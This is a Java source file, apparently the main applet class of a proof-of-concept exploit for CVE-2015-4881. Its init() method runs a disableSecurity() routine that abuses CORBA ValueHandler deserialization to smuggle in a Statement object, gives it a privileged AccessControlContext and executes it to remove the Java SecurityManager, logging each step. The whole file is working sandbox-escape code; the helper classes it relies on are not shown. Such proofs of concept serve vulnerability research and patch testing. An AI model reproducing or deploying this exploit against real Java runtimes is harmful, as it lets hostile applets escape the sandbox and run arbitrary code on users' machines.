package poc.cve_2015_4881;

import java.applet.Applet;
import java.io.ObjectInputStream;
import java.security.AccessControlContext;
import java.security.ProtectionDomain;

import javax.rmi.CORBA.Util;
import javax.rmi.CORBA.ValueHandler;

import org.omg.CORBA.ORB;
import org.omg.CORBA.portable.InputStream;
import org.omg.CORBA.portable.OutputStream;

import poc.shared.Utils;

public class Main extends Applet {

	private static final long serialVersionUID = 1316999091486904265L;
	
	public static ObjectInputStream OI_INSTANCE;
	public static PublicStatement.Holder HOLDER_INSTANCE;
	
	private static void disableSecurity( ) {
		try {
			Utils.enter( "Removing SecurityManager" );
			
			Utils.log( "Getting ORB instance, this may take a while." );
			final ORB orb = ORB.init();
			final ValueHandler vHandler = Util.createValueHandler();

			final Class< ? > ssHolder = SerialStatement.Holder.class;
			final Class< ? > psHolder = PublicStatement.Holder.class;
			final String psHolder_ID = vHandler.getRMIRepositoryID( psHolder );

			Utils.log( "Initializing OutputStream." );
			final OutputStream oStream = orb.create_output_stream();
			oStream.write_ulong( 2 );
			oStream.write_string( vHandler.getRMIRepositoryID( ssHolder ) );
			vHandler.writeValue( oStream, new SerialStatement.Holder( ) );
			
			Utils.log( "Creating InputStream." );
			final InputStream iStream = oStream.create_input_stream();
			try {
				Utils.log( "Reading in Objects." );
				vHandler.readValue( iStream, 0, psHolder, psHolder_ID, null );
			} catch( Throwable t ) { }
			
			Utils.log( "Creating Privileged AccessControlContext." );
			ProtectionDomain[] pd = {
				Utils.createPrivilegedDomain()	
			};
			AccessControlContext acc = new AccessControlContext( pd );
			
			Utils.log( "Replacing AccessControlContext." );
			Main.HOLDER_INSTANCE.statement.acc = acc;
			Utils.log( "Executing Statement." );
			SerialStatement.INSTANCE.execute();
			Main.HOLDER_INSTANCE.statement = null;
			
			Utils.log( "SecurityManager removed." );
		}
		catch( Throwable t ) {
			Utils.log( "Error removing SecurityManager." );
			t.printStackTrace();
		}
		finally {
			Utils.exit();
		}
	}
	
	@Override
	public void init( ) {
		System.err.println( "SecurityManager: " + System.getSecurityManager() );
		Main.disableSecurity();
		System.err.println( "SecurityManager: " + System.getSecurityManager() );
	}
}
